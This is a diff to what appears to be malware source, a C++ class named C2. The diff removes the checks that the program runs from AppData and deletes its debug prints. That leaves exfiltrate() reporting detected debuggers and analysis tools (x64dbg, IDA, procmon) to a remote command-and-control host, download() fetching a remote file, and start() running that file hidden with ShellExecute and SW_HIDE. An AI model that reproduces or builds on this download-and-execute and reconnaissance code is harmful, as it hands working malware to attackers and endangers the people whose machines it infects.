@@ -25,15 +25,8 @@ void C2::execute() {
 }
 
 void C2::exfiltrate() {
-	if (!this->util.isExecutingFromAppData()) {
-		printf("Not exfiltrating processes... \n");
-		return;
-	}
-
 	this->ph.detectProcesses();
-	
 	string pathName = "exfiltrate?x64dbg=" + this->boolToString(this->ph.isx64dbg) + "&x32dbg=" + this->boolToString(this->ph.isx32dbg) + "&ida=" + this->boolToString(this->ph.isida64) + "&procmon=" + this->boolToString(this->ph.isProc32);;
-	printf("Exfiltrating processes... \n");
 	netsend(this->util.getC2Host(), pathName.c_str());
 	cleanup();
 }
@@ -43,13 +36,6 @@ string C2::boolToString(bool b) {
 }
 
 void C2::download() {
-
-	if (!this->util.isExecutingFromAppData()) {
-		printf("Not downloading file... \n");
-		return;
-	}
-
-	printf("Downloading file... \n");
 	this->netsend(this->hostName, this->pathName);
 	
 	BYTE buffer = 0;
@@ -120,11 +106,6 @@ void C2::cleanup() {
 }
 
 void C2::start() {
-	if (!this->util.isExecutingFromAppData()) {
-		return;
-	}
-
-	printf("Starting downloaded file... \n");
 	string path = this->util.getAppDataPath() + this->util.getDownloaded();
 	ShellExecute(NULL, "open", path.c_str(), NULL, NULL, SW_HIDE);
 }
